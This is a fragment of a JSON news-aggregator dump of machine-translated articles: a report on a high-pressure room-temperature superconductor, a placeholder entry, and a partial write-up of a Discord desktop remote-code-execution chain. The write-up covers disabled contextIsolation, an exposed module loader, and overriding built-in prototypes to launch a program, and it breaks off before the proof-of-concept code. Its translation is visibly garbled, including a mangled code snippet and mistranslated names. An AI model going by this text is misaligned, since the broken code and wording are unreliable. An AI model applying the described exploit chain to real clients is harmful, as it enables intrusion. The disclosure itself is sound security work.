u7aef\u7684\u94dc\u57fa\u9676\u74f7\u6750\u6599\u4e5f\u53ea\u80fd\u5de5\u4f5c\u5728133K(\u2212140\u2009\u00b0C)\u4ee5\u4e0b\u3002\u5728\u5ba4\u6e29\u4e0b\u5de5\u4f5c\u7684\u8d85\u5bfc\u4f53\u53ef\u80fd\u4f1a\u4ea7\u751f\u91cd\u5927\u7684\u6280\u672f\u5f71\u54cd\uff0c\u4f8b\u5982\u5728\u8fd0\u884c\u66f4\u5feb\u800c\u4e0d\u8fc7\u70ed\u7684\u7535\u5b50\u4ea7\u54c1\u4e2d\u3002\n\u5fb7\u56fd\u7f8e\u56e0\u8328\u9a6c\u514b\u65af\u00b7\u666e\u6717\u514b\u5316\u5b66\u7814\u7a76\u6240(Max Planck Institute For Chemical)\u7684\u7269\u7406\u5b66\u5bb6\u7c73\u54c8\u4f0a\u5c14\u00b7\u57c3\u96f7\u59c6\u8328(Mikhail Erets)\u8868\u793a\uff0c10\u670814\u65e5\u53d1\u8868\u5728\u300a\u81ea\u7136\u300b(Nature)\u6742\u5fd7\u4e0a\u7684\u8fd9\u9879\u6700\u65b0\u7814\u7a76\u4f3c\u4e4e\u63d0\u4f9b\u4e86\u4ee4\u4eba\u4fe1\u670d\u7684\u9ad8\u6e29\u5bfc\u7535\u6027\u8bc1\u636e-\u5c3d\u7ba1\u4ed6\u8865\u5145\u8bf4\uff0c\u4ed6\u5e0c\u671b\u4ece\u5b9e\u9a8c\u4e2d\u770b\u5230\u66f4\u591a\u201c\u539f\u59cb\u6570\u636e\u201d\u3002\u4ed6\u8865\u5145\u8bf4\uff0c\u8fd9\u8bc1\u660e\u4e86\u4ed6\u57282015\u5e74\u5f00\u59cb\u7684\u4e00\u7cfb\u5217\u5de5\u4f5c\u662f\u6b63\u786e\u7684\uff0c\u5f53\u65f6\u4ed6\u7684\u56e2\u961f\u62a5\u544a\u4e86\u7b2c\u4e00\u4e2a\u9ad8\u538b\u9ad8\u6e29\u8d85\u5bfc\u4f53-\u4e00\u79cd\u6c22\u548c\u786b\u7684\u5316\u5408\u7269\uff0c\u7535\u963b\u9ad8\u8fbe\u221270\u2009\u00b0C\u3002\n2018\u5e74\uff0c\u4e00\u79cd\u7531\u6c22\u548c\u9567\u7ec4\u6210\u7684\u9ad8\u538b\u5316\u5408\u7269\u5728\u221213\u2009\u00b0C\u88ab\u8bc1\u5b9e\u662f\u8d85\u5bfc\u7684\uff0c\u4f46\u6700\u65b0\u7684\u7ed3\u679c\u6807\u5fd7\u7740\u8fd9\u79cd\u8d85\u5bfc\u7535\u6027\u9996\u6b21\u51fa\u73b0\u5728\u4e09\u79cd\u5143\u7d20\u800c\u4e0d\u662f\u4e24\u79cd\u5143\u7d20\u7684\u5316\u5408\u7269\u4e2d-\u8fd9\u79cd\u6750\u6599\u662f\u7531\u78b3\u3001\u786b\u548c\u6c22\u7ec4\u6210\u7684\u3002\u7814\u7a76\u5408\u8457\u8005\u3001\u62c9\u65af\u7ef4\u52a0\u65af\u5185\u534e\u8fbe\u5927\u5b66\u7269\u7406\u5b66\u5bb6\u963f\u4ec0\u574e\u00b7\u8428\u62c9\u9a6c\u7279(Ashkan Salamat)\u8868\u793a\uff0c\u6dfb\u52a0\u7b2c\u4e09\u79cd\u5143\u7d20\u5927\u5927\u62d3\u5bbd\u4e86\u672a\u6765\u5bfb\u627e\u65b0\u8d85\u5bfc\u4f53\u7684\u5b9e\u9a8c\u4e2d\u53ef\u4ee5\u5305\u62ec\u7684\u7ec4\u5408\u3002\u4ed6\u8bf4\uff0c\u201c\u6211\u4eec\u5f00\u8f9f\u4e86\u4e00\u4e2a\u5168\u65b0\u7684\u52d8\u63a2\u9886\u57df\u201d\u3002\n\u4f0a\u5229\u8bfa\u4f0a\u5dde\u83b1\u8499\u7279\u963f\u8d21\u56fd\u5bb6\u5b9e\u9a8c\u5ba4\u7684\u9ad8\u538b\u6750\u6599\u79d1\u5b66\u5bb6\u9a6c\u5fb7\u91cc\u00b7\u7d22\u9a6c\u4e9a\u7956\u9c81(Maddury Somayazulu)\u8bf4\uff0c\u5728\u9ad8\u538b\u4f46\u4e0d\u662f\u6781\u7aef\u538b\u529b\u4e0b\u8d85\u5bfc\u7684\u6750\u6599\u53ef\u80fd\u5df2\u7ecf\u6295\u5165\u4f7f\u7528\u3002\u4ed6\u8bf4\uff0c\u8fd9\u9879\u7814\u7a76\u8868\u660e\uff0c\u901a\u8fc7\u201c\u660e\u667a\u5730\u9009\u62e9\u8d85\u5bfc\u4f53\u4e2d\u7684\u7b2c\u4e09\u548c\u7b2c\u56db\u79cd\u5143\u7d20\u201d\uff0c\u539f\u5219\u4e0a\u53ef\u4ee5\u964d\u4f4e\u8d85\u5bfc\u4f53\u7684\u8fd0\u884c\u538b\u529b\u3002\n\u8fd9\u9879\u5de5\u4f5c\u4e5f\u8bc1\u5b9e\u4e86\u7ebd\u7ea6\u5dde\u4f0a\u8428\u5361\u5e02\u5eb7\u5948\u5c14\u5927\u5b66\u7684\u7406\u8bba\u7269\u7406\u5b66\u5bb6\u5c3c\u5c14\u00b7\u963f\u4ec0\u514b\u7f57\u592b\u7279\u51e0\u5341\u5e74\u6765\u7684\u9884\u6d4b\uff0c\u5373\u5bcc\u6c22\u6750\u6599\u53ef\u80fd\u5728\u6bd4\u4eba\u4eec\u8ba4\u4e3a\u53ef\u80fd\u7684\u6e29\u5ea6\u9ad8\u5f97\u591a\u7684\u6e29\u5ea6\u4e0b\u8d85\u5bfc\u3002\u7d22\u9a6c\u4e9a\u7956\u9c81\u8bf4\uff1a\u201c\u6211\u8ba4\u4e3a\uff0c\u5728\u9ad8\u538b\u793e\u533a\u4e4b\u5916\uff0c\u5f88\u5c11\u6709\u4eba\u628a\u4ed6\u5f53\u56de\u4e8b\u3002\u201d\n\u7ebd\u7ea6\u7f57\u5207\u65af\u7279\u5927\u5b66(University Of Rochester)\u7684\u7269\u7406\u5b66\u5bb6\u5170\u52a0\u00b7\u8fea\u4e9a\u65af(Ranga Dias)\u4e0e\u8428\u62c9\u9a6c\u7279(Salamat)\u548c\u5176\u4ed6\u5408\u4f5c\u8005\u4e00\u8d77\uff0c\u5c06\u78b3\u3001\u6c22\u548c\u786b\u7684\u6df7\u5408\u7269\u653e\u5165\u4e86\u4ed6\u4eec\u5728\u4e24\u9897\u94bb\u77f3\u5c16\u7aef\u4e4b\u95f4\u96d5\u523b\u7684\u4e00\u4e2a\u5fae\u5c0f\u7684\u58c1\u9f9b\u4e2d\u3002\u7136\u540e\uff0c\u4ed6\u4eec\u7528\u6fc0\u5149\u5728\u6837\u54c1\u4e2d\u5f15\u53d1\u5316\u5b66\u53cd\u5e94\uff0c\u5e76\u89c2\u5bdf\u6676\u4f53\u7684\u5f62\u6210\u3002\u5f53\u4ed6\u4eec\u964d\u4f4e\u5b9e\u9a8c\u6e29\u5ea6\u65f6\uff0c\u6d41\u7ecf\u6750\u6599\u7684\u7535\u6d41\u7535\u963b\u964d\u5230\u96f6\uff0c\u8fd9\u8868\u660e\u6837\u54c1\u5df2\u7ecf\u53d8\u6210\u8d85\u5bfc\u3002\u7136\u540e\u4ed6\u4eec\u589e\u52a0\u4e86\u538b\u529b\uff0c\u53d1\u73b0\u8fd9\u79cd\u8f6c\u53d8\u53d1\u751f\u5728\u8d8a\u6765\u8d8a\u9ad8\u7684\u6e29\u5ea6\u4e0b\u3002\u4ed6\u4eec\u7684\u6700\u597d\u7ed3\u679c\u662f\u5728267\u5343\u5146\u5e15\u65af\u5361\u4e0b\u7684\u8f6c\u53d8\u6e29\u5ea6\u4e3a287.7\u5f00\u5c14\u6587-\u76f8\u5f53\u4e8e\u6d77\u5e73\u9762\u5927\u6c14\u538b\u7684260\u4e07\u500d\u3002\n\u7814\u7a76\u4eba\u5458\u8fd8\u53d1\u73b0\u4e86\u4e00\u4e9b\u8bc1\u636e\uff0c\u8868\u660e\u6676\u4f53\u5728\u8f6c\u53d8\u6e29\u5ea6\u65f6\u6392\u51fa\u4e86\u78c1\u573a\uff0c\u8fd9\u662f\u8d85\u5bfc\u7535\u6027\u7684\u5173\u952e\u6d4b\u8bd5\u3002\u4f46\u7814\u7a76\u4eba\u5458\u8b66\u544a\u8bf4\uff0c\u5173\u4e8e\u8fd9\u79cd\u6750\u6599\u7684\u5927\u90e8\u5206\u5185\u5bb9\u4ecd\u4e0d\u6e05\u695a\u3002\u201c\u6709\u5f88\u591a\u4e8b\u60c5\u8981\u505a\uff0c\u201d\u57c3\u96f7\u59c6\u8328\u8bf4\u3002\u751a\u81f3\u8fde\u6676\u4f53\u7684\u786e\u5207\u7ed3\u6784\u548c\u5316\u5b66\u5f0f\u90fd\u8fd8\u4e0d\u6e05\u695a\u3002\u8428\u62c9\u9a6c\u7279\u8bf4\uff1a\u201c\u5f53\u4f60\u65bd\u52a0\u66f4\u9ad8\u7684\u538b\u529b\u65f6\uff0c\u6837\u672c\u91cf\u5c31\u4f1a\u53d8\u5c0f\u3002\u201d\u201c\u8fd9\u5c31\u662f\u4f7f\u8fd9\u4e9b\u7c7b\u578b\u7684\u6d4b\u91cf\u771f\u6b63\u5177\u6709\u6311\u6218\u6027\u7684\u539f\u56e0\u3002\u201d\n\u7531\u6c22\u548c\u53e6\u4e00\u79cd\u5143\u7d20\u7ec4\u6210\u7684\u9ad8\u538b\u8d85\u5bfc\u4f53\u662f\u4f17\u6240\u5468\u77e5\u7684\u3002\u7ebd\u7ea6\u5dde\u7acb\u5927\u5b66\u5e03\u6cd5\u7f57\u5206\u6821\u7684\u8ba1\u7b97\u5316\u5b66\u5bb6\u4f0a\u5a03\u00b7\u7956\u96f7\u514b(Eva Zurek)\u8bf4\uff0c\u7814\u7a76\u4eba\u5458\u5df2\u7ecf\u5bf9\u78b3\u3001\u6c22\u548c\u786b\u7684\u9ad8\u538b\u6df7\u5408\u7269\u8fdb\u884c\u4e86\u8ba1\u7b97\u673a\u6a21\u62df\u3002\u4f46\u5979\u8bf4\uff0c\u8fd9\u4e9b\u7814\u7a76\u4e0d\u80fd\u89e3\u91ca\u8fea\u4e9a\u65af\u7814\u7a76\u5c0f\u7ec4\u770b\u5230\u7684\u5f02\u5e38\u9ad8\u7684\u8d85\u5bfc\u6e29\u5ea6\u3002\u5979\u8bf4\uff1a\u201c\u6211\u76f8\u4fe1\uff0c\u5728\u8fd9\u7bc7\u624b\u7a3f\u53d1\u8868\u540e\uff0c\u8bb8\u591a\u7406\u8bba\u548c\u5b9e\u9a8c\u5c0f\u7ec4\u90fd\u4f1a\u8df3\u5230\u8fd9\u4e2a\u95ee\u9898\u4e0a\u6765\u3002\u201d", "note_en": "Scientists have created a mystery material that seems to conduct electricity without any resistance at temperatures of up to about 15\u2009\u00b0C. That\u2019s a new record for superconductivity, a phenomenon usually associated with very cold temperatures. The material itself is poorly understood, but it shows the potential of a\u00a0 class of superconductors discovered in 2015.\n  The superconductor has one serious limitation, however: it survives only under extremely high pressures, approaching those at the centre of Earth, meaning that it will not have any immediate practical applications. Still, physicists hope it could pave the way for the development of zero-resistance materials that can function at lower pressures.\n  Superconductors have a number of technological applications, from magnetic resonance imaging machines to mobile-phone towers, and researchers are beginning to experiment with them in high-performance generators for wind turbines. But their usefulness is still limited by the need for bulky cryogenics. Common superconductors work at atmospheric pressures, but only if they are kept very cold. Even the most sophisticated ones\u2014copper oxide-based ceramic materials\u2014work only below 133 kelvin (\u2212140\u2009\u00b0C). Superconductors that work at room temperature could have a big technological impact, for example in electronics that run faster without overheating.\n  The latest study, published\u00a0in\u00a0 Nature\u00a0on 14 October, seems to provide convincing evidence of high-temperature conductivity, says physicist Mikhail Eremets at the Max Planck Institute for Chemistry in Mainz, Germany\u2014although he adds that he would like to see more \u201craw data\u201d from the experiment. He adds that it vindicates a line of work that he started in 2015, when his group reported\u00a0the first high-pressure, high-temperature superconductor\u2014a compound of hydrogen and sulfur that had zero resistance up to \u221270\u2009\u00b0C.\n  In 2018, a high-pressure compound of hydrogen and lanthanum was\u00a0 shown \u00a0to be superconductive at \u221213\u2009\u00b0C. But the latest result marks the first time this kind of superconductivity has been seen in a compound of three elements rather than two\u2014the material is made of carbon, sulfur and hydrogen. Adding a third element greatly broadens the combinations that can be included in future experiments searching for new superconductors, says study co-author Ashkan Salamat, a physicist at the University of Nevada, Las Vegas. \u201cWe\u2019ve opened a whole new region\u201d of exploration, he says.\n  Materials that superconduct at high but not extreme pressures could already be put to use, says Maddury Somayazulu, a high-pressure-materials scientist at Argonne National Laboratory in Lemont, Illinois. The study shows that by \u201cjudiciously choosing the third and fourth element\u201d in a superconductor, he says, you could in principle bring down its operational pressure.\n  The work also validates decades-old predictions by theoretical physicist Neil Ashcroft at Cornell University in Ithaca, New York, that hydrogen-rich materials might superconduct at temperatures much higher than was thought possible. \u201cI think there were very few people outside of the high-pressure community who took him seriously,\u201d Somayazulu says.\n    Physicist Ranga Dias at the University of Rochester in New York, along with Salamat and other collaborators, placed a mixture of carbon, hydrogen and sulfur in a microscopic niche they had carved between the tips of two diamonds. They then triggered chemical reactions in the sample with laser light, and watched as a crystal formed. As they lowered the experimental temperature, resistance to a current passed through the material dropped to zero, indicating that the sample had become superconductive. Then they increased the pressure, and found that this transition occurred at higher and higher temperatures. Their best result was a transition temperature of 287.7 kelvin at 267 gigapascals\u20142.6 million times atmospheric pressure at sea level.\n  The researchers also found some evidence that the crystal expelled its magnetic field at the transition temperature, a crucial test of superconductivity. But much about the material remains unknown, researchers warn. \u201cThere are a lot of things to do,\u201d says Eremets. Even the crystal\u2019s exact structure and chemical formula are not yet understood. \u201cAs you go to higher pressures, the sample size gets smaller,\u201d says Salamat. \u201cThat\u2019s what makes these types of measurements really challenging.\u201d\n  High-pressure superconductors made of hydrogen and one other element are well understood. And researchers have made computer simulations of high-pressure mixtures of carbon, hydrogen and sulfur, says Eva Zurek, a computational chemist at the State University of New York at Buffalo. But she says those studies cannot explain the exceptionally high superconducting temperatures seen by Dias\u2019s group. \u201cI am sure, after this manuscript is published, many theoretical and experimental groups will jump on this problem,\u201d she says.", "posttime": "2020-10-19 13:30:50", "source_domain": "slashdot.org", "source_name": "slashdot", "tags": "\u79d1\u5b66\u5bb6,\u8d85\u5bfc\u4f53,temperature", "title": "\u9996\u4e2a\u5ba4\u6e29\u8d85\u5bfc\u4f53\u8ba9\u79d1\u5b66\u5bb6\u4eec\u5174\u594b\u4e0d\u5df2", "title_en": "First Room-Temperature Superconductor Excites and Baffles Scientists", "transed": 1, "url": "https://www.scientificamerican.com/article/first-room-temperature-superconductor-excites-and-baffles-scientists/", "via": "", "real_tags": ["\u79d1\u5b66\u5bb6", "\u8d85\u5bfc\u4f53"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1029704, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u5728\u6b64\u671f\u95f4\uff0c\u4f60\u53ef\u4ee5\u5c1d\u8bd5\u901a\u8fc7\u8c37\u6b4c\u8fdb\u884c\u641c\u7d22\u3002\u8bf7\u6ce8\u610f\uff0c\u4ed6\u4eec\u5bf9\u6211\u4eec\u5185\u5bb9\u7684\u7d22\u5f15\u53ef\u80fd\u5df2\u8fc7\u671f\u3002", "note_en": "You can try searching via Google in the meantime.  Note that their indexes of our content may be out of date.", "posttime": "2020-10-19 11:14:26", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u8111\u529b\u52b3\u52a8,timing", "title": "\u4f18\u5316\u8111\u529b\u52b3\u52a8\u7684\u65f6\u95f4\u5b89\u6392", "title_en": "Optimizing the Timing of Brainwork", "transed": 1, "url": "https://supermemo.guru/wiki/Optimizing_the_timing_of_brainwork", "via": "", "real_tags": ["\u8111\u529b\u52b3\u52a8", "timing"]}, {"category": "", "categoryclass": "", "imagename": "6dddf8c7cfbeffe72892f08e2144db11.jpeg", "infoid": 1029703, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u51e0\u4e2a\u6708\u524d\uff0c\u6211\u5728Discorde\u684c\u9762\u5e94\u7528\u7a0b\u5e8f\u4e2d\u53d1\u73b0\u4e86\u4e00\u4e2a\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u95ee\u9898\uff0c\u5e76\u901a\u8fc7\u4ed6\u4eec\u7684Bug Bounty Program\u62a5\u544a\u4e86\u8fd9\u4e00\u95ee\u9898\u3002\n\u6211\u53d1\u73b0\u7684RCE\u975e\u5e38\u6709\u8da3\uff0c\u56e0\u4e3a\u5b83\u662f\u901a\u8fc7\u7ec4\u5408\u591a\u4e2abug\u6765\u5b9e\u73b0\u7684\u3002\u5728\u8fd9\u7bc7\u6587\u7ae0\u4e2d\uff0c\u6211\u60f3\u548c\u5927\u5bb6\u5206\u4eab\u4e00\u4e0b\u7ec6\u8282\u3002\n\u6211\u6709\u70b9\u60f3\u627e\u51faElectron\u5e94\u7528\u7a0b\u5e8f\u7684\u6f0f\u6d1e\uff0c\u6240\u4ee5\u6211\u5728\u5bfb\u627e\u4e00\u4e2a\u4e3aElectron\u5e94\u7528\u7a0b\u5e8f\u652f\u4ed8\u8d4f\u91d1\u7684\u6f0f\u6d1e\u8d4f\u91d1\u7a0b\u5e8f\uff0c\u4f46\u6211\u53d1\u73b0\u4e86\u4e0d\u548c\u8c10\u4e4b\u5904\u3002\u6b64\u5916\uff0c\u6211\u662f\u4e00\u4e2a\u4e0d\u548c\u8c10\u7684\u7528\u6237\uff0c\u53ea\u662f\u60f3\u68c0\u67e5\u4e00\u4e0b\u6211\u6b63\u5728\u4f7f\u7528\u7684\u5e94\u7528\u7a0b\u5e8f\u662f\u5426\u5b89\u5168\uff0c\u6240\u4ee5\u6211\u51b3\u5b9a\u8fdb\u884c\u8c03\u67e5\u3002\n\u5f53\u6211\u6d4b\u8bd5Electron\u5e94\u7528\u7a0b\u5e8f\u65f6\uff0c\u6211\u603b\u662f\u9996\u5148\u68c0\u67e5BrowserWindow API\u7684\u9009\u9879\uff0c\u8be5API\u7528\u4e8e\u521b\u5efa\u6d4f\u89c8\u5668\u7a97\u53e3\u3002\u901a\u8fc7\u68c0\u67e5\u5b83\uff0c\u6211\u60f3\u5230\u4e86\u5f53\u53ef\u4ee5\u5728\u5448\u73b0\u5668\u4e0a\u6267\u884c\u4efb\u610fJavaScript\u65f6\u5982\u4f55\u5b9e\u73b0RCE\u3002\nDiscorde\u7684Electron\u5e94\u7528\u7a0b\u5e8f\u4e0d\u662f\u4e00\u4e2a\u5f00\u6e90\u9879\u76ee\uff0c\u4f46Electron\u7684JavaScript\u4ee3\u7801\u662f\u4ee5asar\u683c\u5f0f\u4fdd\u5b58\u5728\u672c\u5730\u7684\uff0c\u6211\u53ea\u9700\u89e3\u538b\u7f29\u5b83\u5c31\u53ef\u4ee5\u9605\u8bfb\u5b83\u3002\nConst mainWindowOptions={Title\uff1a&#39\uff1bdiscord&#39\uff1b\uff0cbackmentColor\uff1agetBackround Color()\uff0cinwidth\uff1adefault_width\uff0c\u9ad8\u5ea6\uff1adefault_width\uff0cinminWidth\uff1amin_width\uff0cinminHeight\uff1amin_Height\uff0c\u900f\u660e\uff1afalse\uff0cframe\uff1afalse\uff0csize able\uff1atrue\uff0cinshow\uff1aisVisible\uff0c.webPreferences\uff1a{1\uff0c0\uff0cblinkFeature\uff1a&#39\uff1bEnumerateDevices\uff0cAudioOutputDevices&#39\uff1b\uff0cnodeIntegration\uff1afalse\uff0cpreload\uff1a_path2.default.join(__dirname\uff0c&39\uff1bmainScreenPreload.js&39\uff1b)\uff0cnativeWindowOpen\uff1atrue\uff0cenableRemoteModule\uff1afalse\uff0c\u62fc\u5199\u68c0\u67e5\uff1atrue}}\uff1b\n\u8fd9\u91cc\u6211\u4eec\u8981\u68c0\u67e5\u7684\u91cd\u8981\u9009\u9879\u7279\u522b\u662fnodeIntegration\u548ccontextIsolation\u3002\u4ece\u4e0a\u9762\u7684\u4ee3\u7801\u4e2d\uff0c\u6211\u53d1\u73b0\u5728\u4e0d\u4e00\u81f4\u7684\u4e3b\u7a97\u53e3\u4e2d\uff0cnodeIntegration\u9009\u9879\u88ab\u8bbe\u7f6e\u4e3afalse\uff0ccontextIsolation\u9009\u9879\u88ab\u8bbe\u7f6e\u4e3afalse(\u6240\u7528\u7248\u672c\u7684\u9ed8\u8ba4\u503c)\u3002\n\u5982\u679cnodeIntegration\u8bbe\u7f6e\u4e3atrue\uff0c\u5219\u7f51\u9875\u7684JavaScript\u53ea\u9700\u8c03\u7528Required()\u5373\u53ef\u8f7b\u677e\u4f7f\u7528Node.js\u529f\u80fd\u3002\u4f8b\u5982\uff0c\u5728Windows\u4e0a\u6267\u884c\u8ba1\u7b97\u5e94\u7528\u7a0b\u5e8f\u7684\u65b9\u5f0f\u662f\uff1a\n\u6b64\u65f6\uff0cnodeIntegration\u88ab\u8bbe\u7f6e\u4e3afalse\uff0c\u56e0\u6b64\u6211\u4e0d\u80fd\u901a\u8fc7\u76f4\u63a5\u8c03\u7528request()\u6765\u4f7f\u7528Node.js\u7279\u6027\u3002\n\u4f46\u662f\uff0c\u4ecd\u7136\u6709\u53ef\u80fd\u8bbf\u95eeNode.js\u529f\u80fd\u3002\u53e6\u4e00\u4e2a\u91cd\u8981\u9009\u9879contextIsolation\u88ab\u8bbe\u7f6e\u4e3afalse\u3002\u5982\u679c\u60a8\u5e0c\u671b\u5728\u5e94\u7528\u7a0b\u5e8f\u4e0a\u6d88\u9664RCE\u7684\u53ef\u80fd\u6027\uff0c\u5219\u4e0d\u5e94\u5c06\u6b64\u9009\u9879\u8bbe\u7f6e\u4e3aFalse\u3002\n\u5982\u679c\u7981\u7528contextIsolation\uff0c\u7f51\u9875\u7684JavaScript\u53ef\u80fd\u4f1a\u5f71\u54cdElectron\u7684\u5185\u90e8JavaScript\u4ee3\u7801\u5728\u5448\u73b0\u5668\u548c\u9884\u52a0\u8f7d\u811a\u672c\u4e0a\u7684\u6267\u884c(\u5728\u4e0b\u6587\u4e2d\uff0c\u8fd9\u4e9bJavaScript\u5c06\u79f0\u4e3a\u7f51\u9875\u5916\u7684JavaScript\u4ee3\u7801)\u3002*\u4f8b\u5982\uff0c\u5982\u679c\u4f7f\u7528\u7f51\u9875JavaScript\u4e2d\u7684\u53e6\u4e00\u4e2a\u51fd\u6570\u8986\u76d6JavaScript\u5185\u7f6e\u65b9\u6cd5\u4e4b\u4e00Array.Prototype.Join\uff0c\u5219\u8c03\u7528Join\u65f6\uff0c\u7f51\u9875\u5916\u7684JavaScript\u4ee3\u7801\u4e5f\u5c06\u4f7f\u7528\u8986\u76d6\u51fd\u6570\u3002\n\u6b64\u884c\u4e3a\u5f88\u5371\u9669\uff0c\u56e0\u4e3aElectron\u5141\u8bb8\u7f51\u9875\u5916\u7684JavaScript\u4ee3\u7801\u4f7f\u7528Node.js\u529f\u80fd\uff0c\u800c\u4e0d\u8003\u8651nodeIntegration\u9009\u9879\uff0c\u5e76\u4e14\u901a\u8fc7\u4ece\u7f51\u9875\u4e2d\u88ab\u8986\u76d6\u7684\u51fd\u6570\u5e72\u6270\u5b83\u4eec\uff0c\u5373\u4f7f\u5c06nodeIntegration\u8bbe\u7f6e\u4e3afalse\uff0c\u4e5f\u53ef\u80fd\u5b9e\u73b0RCE\u3002\n\u987a\u4fbf\u8bf4\u4e00\u53e5\uff0c\u8fd9\u6837\u7684\u628a\u620f\u4ee5\u524d\u662f\u4e0d\u4e3a\u4eba\u6240\u77e5\u7684\u3002\u5b83\u662f\u57282016\u5e74\u7531Cure53\u5728\u4e00\u6b21\u4e94\u89d2\u661f\u6d4b\u8bd5\u4e2d\u9996\u6b21\u53d1\u73b0\u7684\uff0c\u6211\u4e5f\u52a0\u5165\u4e86\u8fd9\u4e2a\u7ec4\u7ec7\u3002\u4e4b\u540e\uff0c\u6211\u4eec\u5c06\u5176\u62a5\u544a\u7ed9\u7535\u5b50\u56e2\u961f\uff0c\u5e76\u4ecb\u7ecd\u4e86contextIsolation\u3002\n\u6700\u8fd1\uff0c\u90a3\u4efd\u6700\u65b0\u7684\u62a5\u544a\u53d1\u8868\u4e86\u3002\u5982\u679c\u60a8\u611f\u5174\u8da3\uff0c\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u94fe\u63a5\u9605\u8bfb\uff1a\nContextIsolation\u5728\u7f51\u9875\u548c\u7f51\u9875\u5916\u90e8\u7684JavaScript\u4ee3\u7801\u4e4b\u95f4\u5f15\u5165\u4e86\u72ec\u7acb\u7684\u4e0a\u4e0b\u6587\uff0c\u56e0\u6b64\u6bcf\u4e2a\u4ee3\u7801\u7684JavaScript\u6267\u884c\u4e0d\u4f1a\u5f71\u54cd\u6bcf\u4e2a\u4ee3\u7801\u3002\u8fd9\u662f\u6d88\u9664RCE\u53ef\u80fd\u6027\u7684\u5fc5\u8981\u63aa\u65bd\uff0c\u4f46\u8fd9\u4e00\u6b21\u5b83\u5728\u4e0d\u548c\u8c10\u4e2d\u88ab\u7981\u7528\u3002\n\u73b0\u5728\u6211\u53d1\u73b0contextIsolation\u88ab\u7981\u7528\u4e86\uff0c\u6240\u4ee5\u6211\u5f00\u59cb\u5bfb\u627e\u4e00\u4e2a\u5730\u65b9\uff0c\u5728\u90a3\u91cc\u6211\u53ef\u4ee5\u901a\u8fc7\u5e72\u6270\u7f51\u9875\u5916\u90e8\u7684JavaScript\u4ee3\u7801\u6765\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002\n\u901a\u5e38\uff0c\u5f53\u6211\u5728Electron\u7684Pentest\u4e2d\u4e3aRCE\u521b\u5efaPoC\u65f6\uff0c\u6211\u9996\u5148\u5c1d\u8bd5\u901a\u8fc7\u5728\u6e32\u67d3\u5668\u4e0a\u4f7f\u7528Electron\u7684\u5185\u90e8JavaScript\u4ee3\u7801\u6765\u5b9e\u73b0RCE\u3002\u8fd9\u662f\u56e0\u4e3a\u7535\u5b50\u5728\u6e32\u67d3\u5668\u4e0a\u7684\u5185\u90e8JavaScript\u4ee3\u7801\u53ef\u4ee5\u5728\u4efb\u4f55\u7535\u5b50\u5e94\u7528\u7a0b\u5e8f\u4e2d\u6267\u884c\uff0c\u6240\u4ee5\u57fa\u672c\u4e0a\u6211\u53ef\u4ee5\u91cd\u7528\u76f8\u540c\u7684\u4ee3\u7801\u6765\u5b9e\u73b0RCE\uff0c\u800c\u4e14\u5f88\u5bb9\u6613\u3002\n\u5728\u6211\u7684\u5e7b\u706f\u7247\u4e2d\uff0c\u6211\u4ecb\u7ecd\u4e86RCE\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528Electron\u5728\u5bfc\u822a\u5b9a\u65f6\u6267\u884c\u7684\u4ee3\u7801\u6765\u5b9e\u73b0\u3002\u8fd9\u4e0d\u4ec5\u53ef\u4ee5\u4ece\u4ee3\u7801\u4e2d\u83b7\u5f97\uff0c\u800c\u4e14\u5728\u67d0\u4e9b\u5730\u65b9\u4e5f\u6709\u8fd9\u6837\u4ee3\u7801\u3002(\u6211\u60f3\u5728\u5c06\u6765\u51fa\u7248PoC\u7684\u4f8b\u5b50\u3002)\u3002\n\u4f46\u662f\uff0c\u6839\u636e\u4f7f\u7528\u7684Electron\u7684\u7248\u672c\u6216\u8bbe\u7f6e\u7684BrowserWindow\u9009\u9879\uff0c\u7531\u4e8e\u4ee3\u7801\u5df2\u66f4\u6539\u6216\u65e0\u6cd5\u6b63\u786e\u8bbf\u95ee\u53d7\u5f71\u54cd\u7684\u4ee3\u7801\uff0c\u6709\u65f6\u901a\u8fc7Electron\u7684\u4ee3\u7801\u7684PoC\u65e0\u6cd5\u6b63\u5e38\u5de5\u4f5c\u3002\u5728\u8fd9\u6bb5\u65f6\u95f4\u5185\uff0c\u5b83\u4e0d\u8d77\u4f5c\u7528\uff0c\u6240\u4ee5\u6211\u51b3\u5b9a\u5c06\u76ee\u6807\u66f4\u6539\u4e3a\u9884\u52a0\u8f7d\u811a\u672c\u3002\n\u5728\u68c0\u67e5\u9884\u52a0\u8f7d\u811a\u672c\u65f6\uff0c\u6211\u53d1\u73b0\u4e0d\u4e00\u81f4\u4f1a\u66b4\u9732\u8be5\u51fd\u6570\uff0c\u4ece\u800c\u5141\u8bb8\u901a\u8fc7DiscordNative.nativeModules.requireModule(&#39\uff1bMODULE-NAME&#39\uff1b)\uff0c\u5c06\u4e00\u4e9b\u5141\u8bb8\u7684\u6a21\u5757\u8c03\u7528\u5230\u7f51\u9875\u4e2d\u3002\n\u5728\u8fd9\u91cc\uff0c\u6211\u4e0d\u80fd\u4f7f\u7528\u53ef\u4ee5\u76f4\u63a5\u7528\u4e8eRCE\u7684\u6a21\u5757\uff0c\u4f8b\u5982Child_process\u6a21\u5757\uff0c\u4f46\u662f\u6211\u627e\u5230\u4e86\u4e00\u6bb5\u4ee3\u7801\uff0c\u5176\u4e2d\u53ef\u4ee5\u901a\u8fc7\u8986\u76d6JavaScript\u5185\u7f6e\u65b9\u6cd5\u5e76\u5e72\u6270\u516c\u5f00\u7684\u6a21\u5757\u7684\u6267\u884c\u6765\u5b9e\u73b0RCE\u3002\n\u4ee5\u4e0b\u662fPoC\u3002\u5f53\u6211\u4eceDevTools\u8c03\u7528getGPUDriverVersions\u51fd\u6570(\u8be5\u51fd\u6570\u5728\u79f0\u4e3a&#34\uff1bdiscord_utils&#34\uff1b\u7684\u6a21\u5757\u4e2d\u5b9a\u4e49)\u5e76\u8986\u76d6RegExp.Prototype.test\u548cArray.Prototype.join\u65f6\uff0c\u6211\u80fd\u591f\u786e\u8ba4\u5f39\u51faCalc\u5e94\u7528\u7a0b\u5e8f\u3002\nGetGPUDriverVersions\u51fd\u6570\u5c1d\u8bd5\u4f7f\u7528